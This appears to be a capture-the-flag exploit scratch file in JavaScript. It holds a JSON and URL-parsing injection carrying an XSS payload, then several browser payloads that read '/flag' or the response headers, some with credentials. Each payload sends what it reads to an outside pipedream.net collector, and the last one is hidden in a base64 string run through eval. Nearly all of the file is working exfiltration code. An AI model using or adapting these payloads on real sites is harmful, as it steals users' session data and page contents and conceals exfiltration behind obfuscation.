const parse = require('url-parse');

const blog = `","username":"hello","setblog":"javascript://web-noob.kr\u0023\u0025\u0030\u0041'<script>alert(1)</script>'`;
const user = JSON.parse(`{"username":"Tester", "setblog":"${blog}"}`);
const url = parse(user['setblog'], true)
    , hostname = url.hostname;

console.log(user)
console.log(url)

fetch('/', {}).then(res => { data = {}; for (let [key, value] of res.headers) { data[key] = value } fetch('https://eo2ok53qy9siny4.m.pipedream.net', { 'method': 'POST', 'body': JSON.stringify(data) }); });

location.href = "/flag"; setTimeout(() => { location.href = "https://eo2ok53qy9siny4.m.pipedream.net/?flag=".concat(document.body.textContent); }, 1000);


fetch('/flag').then(res => res.text()).then(text => { fetch('https://eo2ok53qy9siny4.m.pipedream.net', { 'method': 'POST', 'body': text }) });

var req = new XMLHttpRequest();
req.onload = reqListener;
req.withCredentials = true;
req.open("GET", "/flag", false);
req.send();
function reqListener() {
    var req2 = new XMLHttpRequest();
    const sess = this.responseText;
    req2.open("POST", "https://eo2ok53qy9siny4.m.pipedream.net/", false);
    req2.send(btoa(sess))
};

eval(atob('dmFyIHJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpyZXEub25sb2FkID0gcmVxTGlzdGVuZXI7CnJlcS53aXRoQ3JlZGVudGlhbHMgPSB0cnVlOwpyZXEub3BlbigiR0VUIiwgIi9mbGFnIiwgZmFsc2UpOwpyZXEuc2VuZCgpOwpmdW5jdGlvbiByZXFMaXN0ZW5lcigpIHsKICAgIHZhciByZXEyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICBjb25zdCBzZXNzID0gdGhpcy5yZXNwb25zZVRleHQ7CiAgICByZXEyLm9wZW4oIlBPU1QiLCAiaHR0cHM6Ly9lbzJvazUzcXk5c2lueTQubS5waXBlZHJlYW0ubmV0LyIsIGZhbHNlKTsKICAgIHJlcTIuc2VuZChidG9hKHNlc3MpKQp9Ow=='))